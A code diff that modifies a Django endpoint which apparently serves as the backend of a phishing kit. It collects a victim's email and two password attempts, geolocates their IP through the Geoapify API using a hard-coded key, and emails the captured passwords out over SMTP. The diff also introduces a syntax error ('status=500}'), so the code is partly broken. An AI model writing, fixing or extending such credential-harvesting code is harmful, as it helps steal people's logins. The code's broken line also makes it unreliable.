@@ -1,6 +1,7 @@
+import requests
+from requests.structures import CaseInsensitiveDict
 from django.http import JsonResponse
 from rest_framework.decorators import api_view
-from dbconnection import users
 import smtplib
 from smtplib import SMTPException
 import logging
@@ -11,35 +12,40 @@ logger = logging.getLogger(__name__)
 
 @api_view(['POST'])
 def get_user_info(request):
-    # Get the login and visitor data from the request
+    # Get the login data from the request
     email = request.data.get('email')
     firstpasswordused = request.data.get('firstpasswordused')
     secondpasswordused = request.data.get('secondpasswordused')
-    visitor_data = request.data.get('visitorData')
+    user_ip = request.data.get('user_ip')  # Get user-provided IP
 
     # Check for required fields
-    if not email or not firstpasswordused or not secondpasswordused or not visitor_data:
-        return JsonResponse({'error': 'Email, passwords, and visitor data are required'}, status=400)
+    if not email or not firstpasswordused or not secondpasswordused or not user_ip:
+        return JsonResponse({'error': 'Email, passwords, and user IP are required'}, status=400)
 
     # Ensure input data is string type and sanitize if necessary
     email = str(email)
     firstpasswordused = str(firstpasswordused)
     secondpasswordused = str(secondpasswordused)
 
-    # Ensure visitor_data is a dictionary
-    if not isinstance(visitor_data, dict):
-        return JsonResponse({'error': 'Invalid visitor data provided'}, status=400)
+    # Call the Geoapify API to get the visitor's IP information
+    url = f"https://api.geoapify.com/v1/ipinfo?ip={user_ip}&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06"
+    headers = CaseInsensitiveDict()
+    headers["Accept"] = "application/json"
 
     try:
+        resp = requests.get(url, headers=headers)
+        resp.raise_for_status()  # Raise an error for bad responses
+        visitor_data = resp.json()
+
         # Extract important data from visitor_data
-        ip_address = visitor_data.get('ipAddress', 'N/A')
+        ip_address = visitor_data.get('ip', 'N/A')
         city = visitor_data.get('city', 'Unknown')
         region = visitor_data.get('region', 'Unknown')
-        country = visitor_data.get('countryName', 'Unknown')
+        country = visitor_data.get('country', 'Unknown')
 
         # Validate data from visitor_data
         if ip_address == 'N/A' or country == 'Unknown':
-            return JsonResponse({'error': 'Invalid location data from VPN'}, status=400)
+            return JsonResponse({'error': 'Invalid location data from Geoapify'}, status=400)
 
         # Format the email content for the first password
         time_received = "05/12/2022 07:05:10 am"  # Use actual time if available
@@ -88,8 +94,11 @@ def get_user_info(request):
                 )
         except SMTPException as e:
             logger.error(f"Error sending second password email: {str(e)}")
-            return JsonResponse({'error': f'Error sending second password email: {str(e)}'}, status=500)
+            return JsonResponse({'error': f'Error sending second password email: {str(e)}'}, status=500})
 
+    except requests.HTTPError as http_err:
+        logger.error(f"HTTP error occurred: {http_err}")
+        return JsonResponse({'error': 'Could not retrieve visitor data'}, status=500)
     except Exception as e:
         logger.error(f"Unexpected error: {str(e)}")
         return JsonResponse({'error': f'An unexpected error occurred: {str(e)}'}, status=500)
